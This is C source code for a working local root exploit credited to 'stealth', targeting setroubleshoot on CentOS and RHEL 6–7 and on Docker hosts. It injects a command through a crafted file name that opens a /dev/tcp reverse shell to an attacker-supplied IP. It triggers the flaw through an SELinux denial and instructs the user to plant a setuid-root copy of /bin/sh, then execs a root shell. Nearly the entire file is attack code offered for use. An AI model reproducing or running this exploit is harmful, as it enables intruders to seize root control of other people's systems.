/* straight shooter - setroubleshoot xSports
 *
 * (C) 2016 by stealth >> https://github.com/stealth/troubleshooter <<
 *
 * $ cc -Wall straight-shooter.c -pedantic -std=c11
 *
 * Requires nc listening on a back connect IP on port 25. Once connect is received,
 * "cd /var/lib/setroubleshoot;cp /bin/sh sh;chmod 04755 sh;" command is entered
 * for rootshell to appear on the system shell.
 *
 */
#define _POSIX_SOURCE
#define _POSIX_C_SOURCE 200809
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/stat.h>


/* %s to be filled with back connect IP
 */
const char dflt_cmd[] = "sh<`pwd`dev`pwd`tcp`pwd`%s`pwd`25";
char file[1024];

enum {
	TARGET_CENTOS66 = 0,
	TARGET_CENTOS67,
	TARGET_CENTOS68,
	TARGET_CENTOS7,
	TARGET_RHEL66,
	TARGET_RHEL67,
	TARGET_RHEL68,
	TARGET_RHEL7,
	TARGET_RHEL71,
	TARGET_DOCKER,
	TARGET_INVALID
};


enum {
	FLAG_FIFO = 0x1000
};


struct target {
	const char *name;
	const char *dir;
	const char *cmd;
	int flags;
	char *const helper[10];
} targets[] = {
	[TARGET_CENTOS66] = {"CentOS 6.6", "/tmp", dflt_cmd, 0,
	                     {"/usr/bin/smbcontrol", "-s", file, "127.0.0.1", "debug", NULL, }},
	[TARGET_CENTOS67] = {"CentOS 6.7", "/tmp", dflt_cmd, 0,
	                     {"/usr/bin/smbcontrol", "-s", file, "127.0.0.1", "debug", NULL, }},
	[TARGET_CENTOS68] = {"CentOS 6.8", "/tmp", dflt_cmd, 0,
	                     {"/usr/bin/smbcontrol", "-s", file, "127.0.0.1", "debug", NULL, }},
	[TARGET_CENTOS7] = {"Centos 7 (1503)", "/dev/shm", dflt_cmd, FLAG_FIFO,
	                    {"/usr/sbin/dhclient", "-pf", file, NULL, }},
	[TARGET_RHEL66] = {"RHEL 6.6", "/tmp", dflt_cmd, 0,
	                  {"/usr/bin/smbcontrol", "-s", file, "127.0.0.1", "debug", NULL, }},
	[TARGET_RHEL67] = {"RHEL 6.7", "/tmp", dflt_cmd, 0,
	                  {"/usr/bin/smbcontrol", "-s", file, "127.0.0.1", "debug", NULL, }},
	[TARGET_RHEL68] = {"RHEL 6.8", "/tmp", dflt_cmd, 0,
	                  {"/usr/bin/smbcontrol", "-s", file, "127.0.0.1", "debug", NULL, }},
	[TARGET_RHEL7] = {"RHEL 7.0", "/dev/shm", dflt_cmd, FLAG_FIFO,
	                  {"/usr/sbin/dhclient", "-pf", file, NULL, }},
	[TARGET_RHEL71] = {"RHEL 7.1", "/dev/shm", dflt_cmd, FLAG_FIFO,
	                  {"/usr/sbin/dhclient", "-pf", file, NULL, }},
	[TARGET_DOCKER] = {"Docker", "/dev/mqueue", dflt_cmd, 0, {NULL, }},
	{NULL, NULL, NULL, 0, {NULL, }}
};


void die(const char *s)
{
	fprintf(stderr, "%s", s);
	exit(errno);
}


int choose_target(const char *tgt)
{
	char buf[1024];

	if (tgt && strcmp(tgt, "docker") == 0)
		return TARGET_DOCKER;
	int fd = open("/etc/os-release", O_RDONLY);
	if (fd < 0) {
		if ((fd = open("/etc/centos-release", O_RDONLY)) < 0) {
			if ((fd = open("/etc/redhat-release", O_RDONLY)) < 0)
				return -1;
		}
	}
	memset(buf, 0, sizeof(buf));
	if (read(fd, buf, sizeof(buf) - 1) < 0) {
		close(fd);
		return -1;
	}
	close(fd);
	if (strstr(buf, "Red Hat Enterprise")) {
		if (strstr(buf, "VERSION=\"7.0"))
			return TARGET_RHEL7;
		if (strstr(buf, "VERSION=\"7.1"))
			return TARGET_RHEL71;
		if (strstr(buf, "release 6.6"))
			return TARGET_RHEL66;
		if (strstr(buf, "release 6.7"))
			return TARGET_RHEL67;
		if (strstr(buf, "release 6.8"))
			return TARGET_RHEL68;
	} else if (strstr(buf, "CentOS release 6.6")) {
		return TARGET_CENTOS66;
	} else if (strstr(buf, "CentOS release 6.7")) {
		return TARGET_CENTOS67;
	} else if (strstr(buf, "CentOS release 6.8")) {
		return TARGET_CENTOS68;
	} else if (strstr(buf, "CentOS Linux")) {
		if (strstr(buf, "VERSION=\"7 "))
			return TARGET_CENTOS7;
	}
	return -1;
}


int check_setrouble()
{
	struct stat st;
	if (stat("/usr/sbin/setroubleshootd", &st) != 0)
		return -1;
	return 1;
}


int main(int argc, char **argv)
{
	int fd = 0, t = 0, i = 0;
	const char *tgtname = NULL, *ip = NULL;
	extern char **environ;
	pid_t pid = 0;
	char *a[] = {"/var/lib/setroubleshoot/sh", "-p", NULL};

	signal(SIGPIPE, SIG_IGN);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	if (argc < 2)
		die("Need back connect IP.\n");

	ip = strdup(argv[1]);

	/* docker target needs to be overriden on cmdline
	 */
	if (argc > 2 && strcmp(argv[2], "docker") == 0)
		tgtname = "docker";

	printf("[*] Choosing target ...\n");
	if ((t = choose_target(tgtname)) < 0)
		die("[-] Cant detect proper target.\n");

	struct target tgt = targets[t];
	printf("[+] Found target %s.\n", tgt.name);

	/* There is no setroubleshoot in docker environments. Its located
	 * outside the chroot jail.
	 */
	if (t != TARGET_DOCKER) {
		if (check_setrouble() != 1)
			die("[-] No vulnerable binary found.\n");
		printf("[+] Found setroubleshoot installed.\n");
	} else
		printf("[*] Not checking for setroubleshoot, as it must be installed *outside* of docker container.\n");

	char cmd[1024];
	snprintf(cmd, sizeof(cmd), tgt.cmd, ip);
	snprintf(file, sizeof(file), "\\';%s;'", cmd);

	if (strcmp(tgt.dir, "$HOME") == 0)
		chdir(getenv("HOME"));
	else
		chdir(tgt.dir);

	if (tgt.flags & FLAG_FIFO) {
		if ((mkfifo(file, 0666) < 0) && (t != TARGET_DOCKER))
			die("[-] opening AVC FIFO trigger\n");
	} else {
		if (((fd = open(file, O_RDWR|O_CREAT, 0600)) < 0) && (t != TARGET_DOCKER))
			die("[-] opening AVC trigger file\n");
		close(fd);
	}

	/* On docker, only the unlink() triggers. Not the open(). */
	if (t == TARGET_DOCKER) {
		unlink(file);
		printf("[*] Got back connect on blind shell?\n");
		return 0;
	}

	/* Fork a helper thats confined by a SELinux policy and will
	 * therefore trigger an AVC deny message on our behalf.
	 */
	if ((pid = fork()) == 0) {
		execve(tgt.helper[0], tgt.helper, environ);
		die("[-] execve of helper failed\n");
	}

	/* Might be that - if exploit is run more than once -
	 * the helper hangs (but still triggers bug)
	 * so timeout after 10s and try rootshell anyway.
	 */
	printf("[*] Waiting for helper to exit (you may see errors)...\n\n");
	for (i = 0; i < 10; ++i) {
		if (waitpid(pid, NULL, WNOHANG) > 0)
			break;
		if (i == 9)
			kill(pid, SIGKILL);
		sleep(1);
	}
	printf("\n[*] You should now be connected on your back connect shell. Enter:\n");
	printf("[*] cd /var/lib/setroubleshoot;cp /bin/sh sh;chmod 04755 sh;\n[*] On that blind shell now and wait for # to appear.\n");

	struct stat st;
	memset(&st, 0, sizeof(st));
	for (;;) {
		stat(*a, &st);
		if ((st.st_mode & 04000) == 04000)
			break;
		fprintf(stderr, ".");
		sleep(1);
	}

	printf("\n[+] Entering root shell.\n");
	unlink(file);

	for (;;) {
		execve(*a, a, environ);
		sleep(3);
	}
	return -1;
}

